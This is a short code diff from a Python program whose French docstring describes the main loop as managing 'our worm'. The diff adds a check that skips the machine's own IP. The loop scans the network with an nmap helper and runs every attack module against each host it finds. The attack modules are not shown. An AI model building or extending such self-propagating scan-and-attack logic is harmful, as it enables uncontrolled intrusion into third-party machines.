@@ -23,24 +23,24 @@ class Events():
         signal(SIGTERM, endOfProgramm)
         self.isStart           = True
         self.logs              = FIFO()
+        self.me                = getIp()
         
     def run(self):
         """
         Méthode principale, permet de lancer la boucle pseudo infinie qui gère notre vers
         """
-        self.isStart = True
+        self.isStart = self._continue()
         self.cibles  = {}
         while self.isStart:
-
-            if not self._continue():
-                break
             
             for (host, port) in nmap(self):
-                print(host, port)
-                for attaque in ATTAQUES:
-                    pkg = import_module(attaque)
-                    att = pkg.Attaque(self, host, port)
-                    att.run()
+                host = str(host)
+
+                if host != self.me:
+                    for attaque in ATTAQUES:
+                        pkg = import_module(attaque)
+                        att = pkg.Attaque(self, host, port)
+                        att.run()
 
                 for action in ACTIONS:
                     pkg = import_module(action)
